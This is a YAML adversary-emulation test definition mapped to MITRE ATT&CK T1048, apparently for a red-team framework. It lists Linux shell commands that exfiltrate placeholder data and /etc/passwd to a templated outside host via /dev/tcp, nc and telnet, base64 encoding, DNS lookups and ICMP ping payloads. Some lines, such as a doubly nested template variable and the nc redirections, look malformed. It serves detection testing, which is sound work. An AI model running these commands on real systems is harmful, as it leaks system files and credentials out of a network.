# Reternal remapping of Meta technique: https://github.com/uber-common/metta

name: Linux Data Exfiltration
author: paragonsec
description: Linux Data Exfiltration
reference: https://attack.mitre.org/wiki/Technique/T1048
mitre_technique:
  id: T1048
  platform: Linux
commands:
- input:
    command: echo "super_secret_data" > /dev/tcp/{{ exfil_out_ip }}/{{ exfil_out_port }}
  sleep: 1
  module: exec_shell
- input:
    command: echo "super_secret_data" | base64 > /dev/tcp/{{ exfil_out_ip }}/{{ exfil_out_port }}
  sleep: 1
  module: exec_shell
- input:
    command: echo "super_secret_data" > /bin/nc {{ exfil_out_ip }} {{ exfil_out_port }}
  sleep: 1
  module: exec_shell
- input:
    command: echo "super_secret_data" | base64 > /bin/nc {{ exfil_out_ip }} {{ exfil_out_port }}
  sleep: 1
  module: exec_shell
- input:
    command: cat /etc/passwd | telnet {{ exfil_out_ip }} {{ exfil_out_port }}
  sleep: 1
  module: exec_shell
- input:
    command: cat /etc/passwd | base64 | telnet {{ exfil_out_ip }} {{ exfil_out_port }}
  sleep: 1
  module: exec_shell
- input:
    command: for line in `cat /etc/passwd `; do dig $line.{{ exfil_out_domain }}.local; done
  sleep: 1
  module: exec_shell
- input:
    command: base64 /etc/passwd | xxd -ps -c 16 |while read i; do ping -c1 -s32 -p $i
      127.0.0.1;done
  sleep: 1
  module: exec_shell
- input:
    command: cat /etc/passwd | xxd -p -c 2 | xargs -n 1 -I '{}' ping -c 1 -t 1 -p '{}'
      127.0.0.1 ; ping -c 1 -t 1 -s 55 127.0.0.1
  sleep: 1
  module: exec_shell
- input:
    command: for line in `gzip -c /etc/passwd | xxd -p -`; do dig $line.{{ {{ exfil_out_domain }} }}.local
      @127.0.0.1;done
  sleep: 1
  module: exec_shell
